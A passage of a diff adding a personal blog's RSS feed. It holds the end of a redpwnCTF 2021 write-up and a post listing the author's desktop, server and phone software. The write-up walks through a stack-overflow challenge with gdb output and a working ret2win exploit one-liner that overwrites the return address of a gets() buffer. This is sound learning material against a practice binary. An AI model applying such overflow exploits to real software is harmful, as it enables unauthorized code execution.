+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     32
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     setbuf
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     stdout
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     NULL
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     setbuf
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     stdin
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     NULL
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     setbuf
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     stderr
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token constant"&gt;
+     NULL
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable..."
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "slap on some flavortext and there's no way rob will fire me now!"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "this is genius!! what do you think?"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     gets
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     comments_and_concerns
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     }
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  With my newfound knowledge of binary exploitation, I figured I would have to
+overwrite the return pointer on the stack somehow, so the program calls the
+  &lt;code&gt;
+   super_generic_flag_reading_function_please_ret_to_me
+  &lt;/code&gt;
+  function that isn't
+called at all in the original.
+ &lt;/p&gt;
+ &lt;p&gt;
+  The only input we have control over is again a call to
+  &lt;code&gt;
+   gets();
+  &lt;/code&gt;
+ &lt;/p&gt;
+ &lt;p&gt;
+  Let's look at the dissassembly in gdb:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) disas main
+Dump of assembler code for function main:
+   0x00000000004013f4 &lt;+79&gt;:    call   0x4010a0 &lt;puts@plt&gt;
+   0x00000000004013f9 &lt;+84&gt;:    lea    rdi,[rip+0xca0]        # 0x4020a0
+   0x0000000000401400 &lt;+91&gt;:    call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401405 &lt;+96&gt;:    lea    rdi,[rip+0xd0c]        # 0x402118
+   0x000000000040140c &lt;+103&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401411 &lt;+108&gt;:   lea    rdi,[rip+0xd48]        # 0x402160
+   0x0000000000401418 &lt;+115&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x000000000040141d &lt;+120&gt;:   lea    rax,[rbp-0x20]
+   0x0000000000401421 &lt;+124&gt;:   mov    rdi,rax
+   0x0000000000401424 &lt;+127&gt;:   call   0x4010e0 &lt;gets@plt&gt;
+   0x0000000000401429 &lt;+132&gt;:   mov    eax,0x0
+   0x000000000040142e &lt;+137&gt;:   leave
+   0x000000000040142f &lt;+138&gt;:   ret
+End of assembler dump.
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  We see again multiple calls to
+  &lt;code&gt;
+   &lt;puts@plt&gt;
+  &lt;/code&gt;
+  and right after a call to
+  &lt;code&gt;
+   &lt;gets@plt&gt;
+  &lt;/code&gt;
+  . There is no
+  &lt;code&gt;
+   cmp
+  &lt;/code&gt;
+  and
+  &lt;code&gt;
+   jne
+  &lt;/code&gt;
+  to be found in this challenge though.
+ &lt;/p&gt;
+ &lt;p&gt;
+  The goal is to overwrite the
+  &lt;em&gt;
+   return adress
+  &lt;/em&gt;
+  . This is a memory adress also
+stored in memory, and the program will move execution to that memory adress
+once it sees a
+  &lt;code&gt;
+   ret
+  &lt;/code&gt;
+  instruction. In this 'vanilla' state, the return adress
+always goes to the assembly equivalent of an
+  &lt;code&gt;
+   exit()
+  &lt;/code&gt;
+  function. Let's see if we
+can overwrite it by giving too much input:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) break *0x000000000040142f
+Breakpoint 1 at 0x40142f
+(gdb) run &lt; &lt;(python3 -c "print('a' * 56)")
+-- Breakpoint 1 hit --
+(gdb) info registers
+rax            0x0                 0x0
+rbx            0x401430            0x401430
+rsi            0x7ffff7f7d883      0x7ffff7f7d883
+rdi            0x7ffff7f804e0      0x7ffff7f804e0
+rbp            0x6161616161616161  0x6161616161616161
+rsp            0x7fffffffd898      0x7fffffffd898
+rip            0x40142f            0x40142f &lt;main+138&gt;
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  As you can see, the $rbp register is completely overwritten with
+  &lt;code&gt;
+   0x61
+  &lt;/code&gt;
+  's.
+Let's check the $rsp register to see where the
+  &lt;code&gt;
+   main()
+  &lt;/code&gt;
+  function tries to go
+after
+  &lt;code&gt;
+   ret
+  &lt;/code&gt;
+  :
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) run
+Starting program: ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3
+-- Breakpoint 1 hit --
+(gdb) x/1gx $rsp
+0x7fffffffd898: 0x3363326331633063
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Let's use cyberchef to see what
+  &lt;code&gt;
+   0x3363326331633063
+  &lt;/code&gt;
+  is in ascii!
+ &lt;/p&gt;
+ &lt;p&gt;
+ &lt;/p&gt;
+ &lt;div class="image"&gt;
+  &lt;img src="/img/redpwn2021/cyberchef1.png" alt=""&gt;
+ &lt;/div&gt;
+ &lt;p&gt;
+ &lt;/p&gt;
+ &lt;p&gt;
+  Hmm, it's backwards. Let's reverse it!
+ &lt;/p&gt;
+ &lt;p&gt;
+ &lt;/p&gt;
+ &lt;div class="image"&gt;
+  &lt;img src="/img/redpwn2021/cyberchef2.png" alt=""&gt;
+ &lt;/div&gt;
+ &lt;p&gt;
+ &lt;/p&gt;
+ &lt;p&gt;
+  Let's find the adress of the super generic flag reading function with gdb.
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) print super_generic_flag_reading_function_please_ret_to_me
+$2 = {&lt;text variable, no debug info&gt;} 0x4011f6 &lt;super_generic_flag_reading_function_please_ret_to_me&gt;
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Now we're ready to craft a string that exploits the program and runs the secret
+function!
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   a0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3 &lt;- original
+                                        c0c1c2c3 &lt;- ends up in $rsp
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa         &lt;- padding ( 0x28 * 'a' )
+
+  c 0 c 1 c 2 c 3  &lt;- ends up in $rsp
+  3 c 2 c 1 c 0 c  &lt;- reverse
+0x3363326331633063 &lt;- reverse (hex)
+0x00000000004011f6 &lt;- pointer we want in $rsp
+  f611400000000000 &lt;- reverse
+  \xf6\x11\x40\x00\x00\x00\x00\x00 &lt;- python bytestring
+
+exploit string:
+b'a' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Now let's try it in an environment-less shell:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   python3 -c "import sys; sys.stdout.buffer.write(b'a' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00')" | ./ret2generic-flag-reader
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+flag{this_is_a_dummy_flag_go_solve_it_yourself}
+
+Segmentation fault (core dumped)
+sh-5.1$
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;h3 id="revbread-making"&gt;
+  rev/bread-making
+ &lt;/h3&gt;
+ &lt;p&gt;
+  For this challenge, I first tried using iaito again to do some program flow
+analysis. After giving up on that, I decided to instead brute-force the correct
+steps by hand. This was a very long and boring process.
+ &lt;/p&gt;
+ &lt;p&gt;
+  First I used
+  &lt;code&gt;
+   strings
+  &lt;/code&gt;
+  again to extract all the dialogue and user input strings
+from the binary. Then I filtered them to not include obvious dialogue, but only
+the possible user input strings. And this is the correct path that gives the
+flag:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   add flour
+add salt
+add yeast
+add water
+hide the bowl inside a box
+wait 3 hours
+work in the basement
+preheat the toaster oven
+set a timer on your phone
+watch the bread bake
+pull the tray out with a towel
+open the window
+unplug the oven
+unplug the fire alarm
+wash the sink
+clean the counters
+flush the bread down the toilet
+get ready to sleep
+close the window
+replace the fire alarm
+brush teeth and go to bed
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  In hindsight I could've probably made a simple python script to brute force all
+remaining possibilities until it got longer output from the program, but
+laziness took over and I decided that spending 45 minutes doing very dull work
+was more worth it instead.
+ &lt;/p&gt;
+ &lt;h2 id="epilogue"&gt;
+  Epilogue
+ &lt;/h2&gt;
+ &lt;p&gt;
+  Of the 47 total challenges, me and Willem only solved 15. My end goal for this
+CTF wasn't winning to begin with, so the outcome didn't matter for me. After
+the second day I set the goal of reaching the 3rd page of the leaderboards as
+my goal, and we reached 277'th place in the end which made my mom very proud!
+ &lt;/p&gt;
+ &lt;p&gt;
+ &lt;/p&gt;
+ &lt;div class="image"&gt;
+  &lt;img src="/img/redpwn2021/leaderboard.png" alt=""&gt;
+ &lt;/div&gt;
+ &lt;p&gt;
+ &lt;/p&gt;
+ &lt;p&gt;
+  I enjoyed the CTF a lot! There were some very frustrating challenges, and I
+still don't get how people solved web/wtjs, but that's fine. I did learn how to
+use GDB and a lot of other things during the CTF which were all very rewarding.
+I will definitely be participating in the 2022 redpwnCTF, and maybe even some
+others if they're beginner friendly :)
+ &lt;/p&gt;
+ &lt;p&gt;
+  During the Radboud CTF and this CTF I've accumulated a lot of ideas to maybe
+host one myself, though I have no clue where to start with that. Maybe keep an
+eye out for that ;)
+ &lt;/p&gt;
+&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>Software that I use</title>
+      <guid>software</guid>
+      <link>/post/software</link>
+      <pubDate>April 13 2021</pubDate>
+      <description>&lt;div class="contentWrapper"&gt;
+ &lt;h2 id="pc-software"&gt;
+  PC software
+ &lt;/h2&gt;
+ &lt;p&gt;
+  All of the software on this page is cool and I think you should try it. I also
+use all of this software, and will update this page when I find new,
+  &lt;em&gt;
+   even
+cooler
+  &lt;/em&gt;
+  software to use instead. Most if not all of my configuration files
+(dotfiles) are on my
+  &lt;a href="https://github.com/lonkaars/dotfiles"&gt;
+   github
+  &lt;/a&gt;
+  . You can
+clone these and edit them to fit your needs, or you can use them as a reference
+for when you can't figure out how to configure something.
+ &lt;/p&gt;
+ &lt;h3 id="regular-software"&gt;
+  Regular software
+ &lt;/h3&gt;
+ &lt;ul&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Email client
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://neomutt.org/"&gt;
+     neomutt
+    &lt;/a&gt;
+    . It's fast and simple,
+though configuring it was a pain in the ass. I'm currently using it in
+combination with mbsync and imapnotify to get notifications for new emails,
+and sync my mailbox for fast email viewing.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Music player
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://www.musicpd.org/"&gt;
+     mpd
+    &lt;/a&gt;
+    with
+    &lt;a href="https://github.com/ncmpcpp/ncmpcpp"&gt;
+     ncmpcpp
+    &lt;/a&gt;
+    . This is the best music setup
+I've ever used. I download all my music in .flac format and mpd
+    &lt;em&gt;
+     just works
+    &lt;/em&gt;
+    .
+Since mpd has a server-client structure, I could also use this to set up
+multiple devices that can add music to a central queue at a party or
+something, but I just use it to launch
+    &lt;a href="https://github.com/DanielFGray/fzf-scripts/blob/master/fzmp"&gt;
+     an fzf mpc
+wrapper
+    &lt;/a&gt;
+    to
+quickly add music while I'm doing something else.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Text editor
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://neovim.io/"&gt;
+     nvim
+    &lt;/a&gt;
+    . It's vim. If you don't like vim,
+you should try using it longer. If you still don't like vim, you can use
+    &lt;a href="https://appimage.github.io/Code_OSS/"&gt;
+     code oss
+    &lt;/a&gt;
+    which is visual studio code
+but without Microsoft's creepy telemetry features.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     PDF viewer
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://pwmt.org/projects/zathura/"&gt;
+     zathura
+    &lt;/a&gt;
+    . It's a pdf
+viewer with vim bindings, and it works with my TeX editing setup's live
+reload thingy.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Image viewer
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/muennich/sxiv"&gt;
+     sxiv
+    &lt;/a&gt;
+    . It's like zathura
+but for images, but it also does a bunch of other stuff that I don't use very
+often.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Browser
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://brave.com/"&gt;
+     brave
+    &lt;/a&gt;
+    . It's a normie-friendly chromium
+fork with extra privacy features! I of course use brave (or any
+chromium-based browser) with
+    &lt;a href="https://www.tampermonkey.net/"&gt;
+     tampermonkey
+    &lt;/a&gt;
+    ,
+    &lt;a href="https://ublockorigin.com/"&gt;
+     ublock origin
+    &lt;/a&gt;
+    ,
+    &lt;a href="https://github.com/openstyles/stylus"&gt;
+     stylus
+    &lt;/a&gt;
+    and
+    &lt;a href="https://darkreader.org/"&gt;
+     dark
+reader
+    &lt;/a&gt;
+    .
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Terminal
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://st.suckless.org/"&gt;
+     st
+    &lt;/a&gt;
+    . It's fast and simple, nothing
+to complain about. I have my
+    &lt;a href="https://github.com/lonkaars/st"&gt;
+     own st fork
+    &lt;/a&gt;
+    ,
+with a bunch of patches that make me happy.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Password manager
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://bitwarden.com/"&gt;
+     bitwarden
+    &lt;/a&gt;
+    . Open source
+password manager that you can host yourself. It also has public servers which
+are mostly free, but some features like time-based one-time passwords are
+paid. All the clients are also open source.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Document typesetting
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://www.latex-project.org/"&gt;
+     LaTeX
+    &lt;/a&gt;
+    (using
+    &lt;a href="https://personal.psu.edu/~jcc8/software/latexmk/"&gt;
+     latexmk
+    &lt;/a&gt;
+    with the
+    &lt;a href="http://xetex.sourceforge.net/"&gt;
+     XeTeX
+    &lt;/a&gt;
+    compiler).
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     File browser
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/ranger/ranger"&gt;
+     ranger
+    &lt;/a&gt;
+    . It's kind of
+slow, but I use the bulkrename feature very often, and I haven't gotten used
+to the perl
+    &lt;code&gt;
+     rename
+    &lt;/code&gt;
+    script yet.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;a href="https://github.com/MacPaw/XADMaster"&gt;
+     unar
+    &lt;/a&gt;
+    . I like running
+    &lt;code&gt;
+     unar [archive]
+    &lt;/code&gt;
+    instead of using
+    &lt;code&gt;
+     7z
+    &lt;/code&gt;
+    ,
+    &lt;code&gt;
+     tar
+    &lt;/code&gt;
+    ,
+    &lt;code&gt;
+     unzip
+    &lt;/code&gt;
+    , etc. It creates a new folder to unpack
+to automatically so it does exactly what I need.
+   &lt;/p&gt;
+  &lt;/li&gt;
+ &lt;/ul&gt;
+ &lt;h3 id="os-stuff"&gt;
+  OS stuff
+ &lt;/h3&gt;
+ &lt;ul&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Window manager
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/Airblader/i3"&gt;
+     i3-gaps
+    &lt;/a&gt;
+    . I tried it
+once and didn't switch back so this is a winner I guess. I've also heard good
+things about
+    &lt;a href="https://dwm.suckless.org/"&gt;
+     dwm
+    &lt;/a&gt;
+    , though I haven't used it
+myself. Most people complain about i3's limited configurability, but I
+haven't ran into something that it doesn't do for me.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Application launcher
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/davatorium/rofi"&gt;
+     rofi
+    &lt;/a&gt;
+    . I've
+been using rofi since I started using linux, and haven't switched to anything
+else because it's
+    &lt;em&gt;
+     very
+    &lt;/em&gt;
+    configurable, and has a dmenu mode for using it
+instead of dmenu with other scripts. I use it primarily as my application
+launcher, but I also have a hotkey setup to launch
+    &lt;code&gt;
+     bwmenu
+    &lt;/code&gt;
+    which is a script
+that fills in bitwarden passwords using rofi.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Shell
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://www.zsh.org/"&gt;
+     zsh
+    &lt;/a&gt;
+    with
+    &lt;a href="https://ohmyz.sh/"&gt;
+     oh-my-zsh
+    &lt;/a&gt;
+    .
+It's zsh, all the cool kids use it already. I do have
+    &lt;code&gt;
+     /usr/bin/sh
+    &lt;/code&gt;
+    &lt;code&gt;
+     ln -s
+    &lt;/code&gt;
+    'd
+to
+    &lt;code&gt;
+     /usr/bin/bash
+    &lt;/code&gt;
+    , but I'd like to change that to
+    &lt;code&gt;
+     /usr/bin/dash
+    &lt;/code&gt;
+    . Eh, I'll
+get around to it someday.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Status Bar
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/polybar/polybar"&gt;
+     polybar
+    &lt;/a&gt;
+    . Simple bar,
+gets the job done, the configuration files make me go insane though. It took
+me a good half year of ricing to understand the polybar configuration files,
+and I'm still not sure if I do.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Notification daemon
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://dunst-project.org/"&gt;
+     dunst
+    &lt;/a&gt;
+    . I used to use
+deadd-notification-center, but that has waaaay too many haskell dependencies
+on arch, so I don't use that anymore.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Global keybinds
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://www.nongnu.org/xbindkeys/xbindkeys.html"&gt;
+     xbindkeys
+    &lt;/a&gt;
+    . Simple
+configuration, works flawlessly, 10/10.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     Compositor
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/yshui/picom"&gt;
+     picom
+    &lt;/a&gt;
+    . It's a simple
+compositor. I use it to enable vsync for desktop windows, and I have it set
+up to only show a drop shadow on floating i3 windows.
+   &lt;/p&gt;
+  &lt;/li&gt;
+ &lt;/ul&gt;
+ &lt;h3 id="closed-source"&gt;
+  Closed source
+ &lt;/h3&gt;
+ &lt;ul&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;a href="https://discord.com/"&gt;
+     discord
+    &lt;/a&gt;
+    . Gamer. The only reason this is listed here
+is because I use discord with
+    &lt;a href="https://github.com/rauenzi/BetterDiscordApp"&gt;
+     betterdiscord
+    &lt;/a&gt;
+    (which
+    &lt;em&gt;
+     is
+    &lt;/em&gt;
+    open-source). Betterdiscord allows you to use custom css themes, custom
+plugins and a whole bunch of other cool stuff that regular discord doesn't
+do. It's technically against TOS, but I don't really care as I only use
+quality of life improvement plugins.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;a href="https://figma.com"&gt;
+     figma
+    &lt;/a&gt;
+    . It's the designing software that I use to create
+user interface or website mockups. It's easily accessible though a browser,
+and it uses webassembly so it's also decently fast. It's free for personal
+use.
+   &lt;/p&gt;
+  &lt;/li&gt;
+ &lt;/ul&gt;
+ &lt;h2 id="server-software"&gt;
+  Server software
+ &lt;/h2&gt;
+ &lt;p&gt;
+  This is the software that runs on my home server.
+ &lt;/p&gt;
+ &lt;h3 id="email"&gt;
+  Email
+ &lt;/h3&gt;
+ &lt;p&gt;
+  I used
+  &lt;a href="http://lukesmith.xyz/"&gt;
+   Luke Smith's
+  &lt;/a&gt;
+  &lt;a href="https://github.com/LukeSmithxyz/emailwiz"&gt;
+   emailwiz
+  &lt;/a&gt;
+  to set up my email server.
+The script installs and configures an email setup with
+  &lt;a href="http://www.postfix.org/"&gt;
+   postfix
+  &lt;/a&gt;
+  ,
+  &lt;a href="https://www.dovecot.org/"&gt;
+   dovecot
+  &lt;/a&gt;
+  ,
+  &lt;a href="https://spamassassin.apache.org/"&gt;
+   spamassassin
+  &lt;/a&gt;
+  and
+  &lt;a href="http://www.opendkim.org/"&gt;
+   opendkim
+  &lt;/a&gt;
+  .
+ &lt;/p&gt;
+ &lt;h3 id="etesync"&gt;
+  Etesync
+ &lt;/h3&gt;
+ &lt;p&gt;
+  I run my own
+  &lt;a href="https://www.etesync.com/"&gt;
+   etesync
+  &lt;/a&gt;
+  server for synchronizing my
+to-do lists, calendar and contacts. It's relatively easy to set up, and has a
+web interface that you can use with your own self-hosted instance.
+ &lt;/p&gt;
+ &lt;h3 id="bitwarden"&gt;
+  Bitwarden
+ &lt;/h3&gt;
+ &lt;p&gt;
+  I also run my own
+  &lt;a href="https://github.com/bitwarden/server"&gt;
+   bitwarden
+  &lt;/a&gt;
+  server. It
+uses docker with docker-compose, which are two things that I'm supposed to know
+about, but I don't.
+ &lt;/p&gt;
+ &lt;p&gt;
+  I'm working on a connect 4 website myself, and I'm planning on learning to use
+docker with docker-compose to make it easier to run the seperate parts that are
+needed to host the project.
+ &lt;/p&gt;
+ &lt;h3 id="git"&gt;
+  Git
+ &lt;/h3&gt;
+ &lt;p&gt;
+  I have a
+  &lt;a href="https://git.zx2c4.com/cgit/about/"&gt;
+   cgit
+  &lt;/a&gt;
+  server to host my git
+repositories on
+  &lt;a href="https://git.pipeframe.xyz"&gt;
+   https://git.pipeframe.xyz
+  &lt;/a&gt;
+  , and I use
+  &lt;a href="https://gitolite.com/gitolite/"&gt;
+   gitolite
+  &lt;/a&gt;
+  for ssh git push access. Cgit is
+very easy to set up, and I like it very much. Gitolite on the other hand is a
+pain in the ass to set up, because the documentation is not that great. If
+you're planning on using gitolite on your own server, set the umask in
+  &lt;code&gt;
+   ~/.gitolite.rc
+  &lt;/code&gt;
+  of your server's git account to
+  &lt;code&gt;
+   0022
+  &lt;/code&gt;
+  .
+ &lt;/p&gt;
+ &lt;h3 id="sftp"&gt;
+  SFTP
+ &lt;/h3&gt;
+ &lt;p&gt;
+  I have two semi-public sftp accounts set up on my server:
+  &lt;code&gt;
+   media
+  &lt;/code&gt;
+  and
+  &lt;code&gt;
+   sftp
+  &lt;/code&gt;
+  .
+  &lt;code&gt;
+   sftp
+  &lt;/code&gt;
+  is for generic file sharing, and
+  &lt;code&gt;
+   media
+  &lt;/code&gt;
+  is for my media. Both accounts
+have tty login disabled and are chroot-jailed to /var/media and /var/sftp.
+ &lt;/p&gt;
+ &lt;h2 id="phone-apps"&gt;
+  Phone apps
+ &lt;/h2&gt;
+ &lt;p&gt;
+  These are the apps that I use on my phone. I have a Nokia 6 (2017), it's pretty
+shitty but I don't really use my phone. I used to have it rooted, but the root
+guide on xda forums was written by some Chinese guy, and it came with a Chinese
+android rom, which caused me to miss a lot of calls.
+ &lt;/p&gt;
+ &lt;h3 id="open-source"&gt;
+  Open source
+ &lt;/h3&gt;
+ &lt;ul&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     One-time password generator
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://github.com/andOTP/andOTP"&gt;
+     andotp
+    &lt;/a&gt;
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
+    &lt;strong&gt;
+     App store
+    &lt;/strong&gt;
+    :
+    &lt;a href="https://gitlab.com/AuroraOSS/AuroraStore"&gt;
+     aurora store
+    &lt;/a&gt;
+    . This
+app works better when you're rooted, but it's way better than the google play
+store.
+   &lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   &lt;p&gt;
